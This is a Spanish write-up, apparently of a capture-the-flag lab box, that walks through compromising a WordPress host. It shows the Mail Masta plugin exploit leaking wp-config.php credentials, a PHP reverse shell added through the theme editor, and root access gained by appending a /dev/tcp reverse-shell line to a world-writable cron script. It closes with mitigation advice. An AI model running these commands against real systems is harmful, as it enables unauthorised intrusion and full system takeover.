
# Resumen 

Durante la evaluación se identificó una superficie de ataque web con WordPress desactualizado y el plugin **Mail Masta 1.0** vulnerable. Mediante ese vector se obtuvieron credenciales desde `wp-config.php`, se accedió al panel de administración y se desplegó una web-shell. La **escalada a root** se logró aprovechando un **cron job** ejecutado por root que apuntaba a un script **world-writable (777)**. Como resultado, se obtuvo control total del host.

## Alcance y metodología

- **Objetivo:** conseguir ejecución de comandos y privilegios de administrador/superusuario.
- **Metodología:**
    1. Reconocimiento activo (Nmap)
    2. Enumeración de HTTP/WordPress (Gobuster/WPScan)
    3. Explotación inicial (Mail Masta → lectura de `wp-config.php`)
    4. Persistencia/Ejecución de código (editor de temas → reverse shell)
    5. **PE**: Abuso de cron job root + script con permisos inseguros



Escaneo nmap

```bash
─(zikuta㉿zikuta)-[~/Desktop/anthem]
└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.201.104.163  -oN nmap.txt  
```


**Hallazgos clave:**

**PORT STATE SERVICE**

* 21/tcp open ftp  
* 22/tcp open ssh  
* 80/tcp open http.

## Enumeración de HTTP/WordPress

Con **Gobuster** se descubrió `/wordpress/` (rastro típico en entornos de laboratorio). Posteriormente, **WPScan** enumeró versión y plugins:


```bash
(zikuta㉿zikuta)-[~/Desktop/allinone]
└─$ wpscan --url http://10.201.7.182/wordpress  --detection-mode aggressive --plugins-version-detection aggressive --enumerate ap,at,dbe  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://10.201.7.182/wordpress/ [10.201.7.182]
[+] Started: Sun Aug 10 18:47:45 2025

Interesting Finding(s):
                                                                                                                                                                                                                  
[+] XML-RPC seems to be enabled: http://10.201.7.182/wordpress/xmlrpc.php                                                                                                                                         
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                 
 | Confidence: 100%                                                                                                                                                                                               
 | References:                                                                                                                                                                                                    
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                                                                                                             
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                                                                                                           
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/                                                                                                                                  
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                                                                            
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/                                                                                                                         
                                                                                                                                                                                                                  
[+] WordPress readme found: http://10.201.7.182/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.201.7.182/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.201.7.182/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://10.201.7.182/wordpress/index.php/feed/atom/, <generator uri="https://wordpress.org/" version="5.5.1">WordPress</generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://10.201.7.182/wordpress/wp-admin/load-styles.php, Match: '5.5.1'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://10.201.7.182/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.201.7.182/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://10.201.7.182/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.201.7.182/wordpress/wp-content/plugins/reflex-gallery/readme.txt
```

**Resultados relevantes:**

- **WordPress 5.5.1** (inseguro, release 2020-09-01).
- **XML-RPC** habilitado.
- **Directory listing** activo en `wp-content/uploads/`.
- **WP-Cron** accesible externamente.
- Plugins detectados:
    
    - **mail-masta 1.0** (vulnerable, vector principal de este compromiso).
    - **reflex-gallery 3.1.7** (no se explotó).


Estas señales combinadas (WP desactualizado, XML-RPC abierto y listado de uploads) ya sugerían una **postura débil de seguridad** antes incluso de confirmar el plugin vulnerable.


## Explotación inicial — Mail Masta 1.0

Se empleó un **exploit público** para el plugin **Mail Masta 1.0**. El payload permitió **leer y decodificar** el archivo **`wp-config.php`**, exponiendo las credenciales de la base de datos, típicamente reutilizadas para otras funciones (o palanca para acceso administrativo). Ejecución y salida:


```bash
zikuta㉿zikuta)-[~/Desktop/allinone/wp-mail-masta-exploit]
└─$ python3 mail-masta-exploit.py http://10.201.7.182/wordpress                                  
[!] Direct read failed or incomplete, trying base64 encoding method
[+] Successfully read and decoded wp-config.php
     
[+] MySQL Database Username: elyana
[+] MySQL Database Password: H@ckme@123
```

Con esas credenciales se validó el acceso al panel de WordPress como administrador.

**Por qué funciona:** el plugin presenta una **falla de validación de entradas** que habilita la **lectura arbitraria** (p. ej., mediante rutas o consultas mal filtradas), permitiendo exfiltrar ficheros sensibles como `wp-config.php`. Desde el punto de vista de riesgo, es **exposición de secretos** que habilita **toma de control de la aplicación**.


## Ejecución de código y acceso inicial (web-shell)

Con acceso al **/wp-admin**, se utilizó el **editor de temas** para subir un **PHP reverse shell** Luego se abrió un listener:

```bash
nc -lvnp 4444
```

Al activar la carga, se obtuvo una **shell como `www-data`**, confirmando **RCE** a través del servidor web.

## Escalada de privilegios (PE) — Cron job root + script 777

Durante la enumeración local se revisó **`/etc/crontab`** y se encontró un **cron job** que ejecutaba **cada minuto** un script:

```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /var/backups/script.sh

```

Al momento de verificar los permisos que tenia el script se encontro...

```bash
wxrwxrwx 1 root root    73 Oct  7  2020 script.sh
$ ls -la
total 56
drwxr-xr-x  2 root root  4096 Apr 27 10:45 .
drwxr-xr-x 14 root root  4096 Oct  5  2020 ..
-rw-r--r--  1 root root 33928 Apr 27 10:41 apt.extended_states.0
-rw-r--r--  1 root root  3598 Oct  6  2020 apt.extended_states.1.gz
-rw-r--r--  1 root root  3570 Oct  5  2020 apt.extended_states.2.gz
-rwxrwxrwx  1 root root    73 Oct  7  2020 script.sh

```

El archivo **`/var/backups/script.sh`** tenía **permisos 777 (rwxrwxrwx)**, es decir, **world-writable** por cualquier usuario, **pero** era **ejecutado por root** desde cron: condición clásica para **Privilege Escalation**.

Se modificó el script para forzar una reverse shell hacia el host del atacante y se preparó el listener:

```bash
echo "bash -i >& /dev/tcp/10.23.120.245/8009 0>&1" >> /var/backups/script.sh
```

En el siguiente minuto de cron, se estableció la conexión inversa como **root**, confirmando la **comprometida escalada de privilegios**

**Resultado:**

```bash
─(zikuta㉿zikuta)-[~/Desktop/allinone]
└─$ nc -lvnp 8009
listening on [any] 8009 ...
connect to [10.23.120.245] from (UNKNOWN) [10.201.7.182] 35298
bash: cannot set terminal process group (3919): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-201-7-182:~#
```

## Evidencias clave (IOEs/artefactos)

- Registro de Nmap con **80/http, 21/ftp**** y **22/ssh** abiertos.
- WPScan mostrando **WordPress 5.5.1**, **XML-RPC** y plugins detectados (incl. **Mail Masta 1.0**).
- Lectura de `wp-config.php` con credenciales **`elyana / H@ckme@123`**.
- `crontab` con **`/var/backups/script.sh`** en ejecución por root + permisos **777** del script.


## Análisis del vector y cadena de ataque

1. **Postura débil de WordPress** (desactualización + superficie ampliada: XML-RPC, listado de uploads).
2. **Plugin vulnerable** que permitió **exfiltrar secretos** (db creds) y, en consecuencia, **acceso administrativo**.
3. **Editor de temas habilitado** → **RCE** mediante web-shell.
4. **Permisos inseguros** y **tarea programada de root** → **PE a root** sin necesidad de exploits kernel ni credenciales adicionales.


## Recomendaciones de mitigación

**Aplicación (WordPress)**

- **Actualizar** WordPress a una versión soportada y **eliminar/actualizar** plugins obsoletos (desinstalar **Mail Masta 1.0**).
- **Deshabilitar el editor de temas** en producción (`DISALLOW_FILE_EDIT` en `wp-config.php`).
- **Restringir/filtrar XML-RPC** (bloqueo por IP, plugins de seguridad, o deshabilitar si no es imprescindible).
- **Desactivar directory listing** en `wp-content/uploads/` 
- **Rotar credenciales** y usar **secret management**; evitar reutilización.



**Sistema/Host**

- Revisar **`/etc/crontab`** y **eliminar** tareas innecesarias; **principio de mínimo privilegio** en cron jobs.
- **Prohibir archivos world-writable** en rutas ejecutadas por root (auditoría de permisos y **umask** segura).
- Aislar el usuario del servidor web (`www-data`) con **AppArmor/SELinux**, `noexec` en directorios de contenido cuando aplique, y deshabilitar intérpretes no requeridos.
- Endurecer RDP (si aplica a este host): **no exponer a Internet**, 2FA, listas de control de acceso, y **network segmentation**.


**Red/Monitoreo**

- **Egress filtering** para bloquear conexiones salientes arbitrarias (evita reverse shells).
- Telemetría/alertas ante cambios en **`/var/*`** y **crontab**; integrarlo con SIEM/EDR.


## Conclusión

El compromiso fue posible por una **combinación de debilidades**: WordPress/plug-in vulnerable + **malas prácticas operativas** (editor de temas expuesto, cron root ejecutando un script 777). La corrección requiere **higiene de parches**, **endurecimiento de permisos** y **controles preventivos** de ejecución y red. La cadena de ataque demostró cómo **una falla en capa aplicación** puede terminar en **toma total del sistema**.


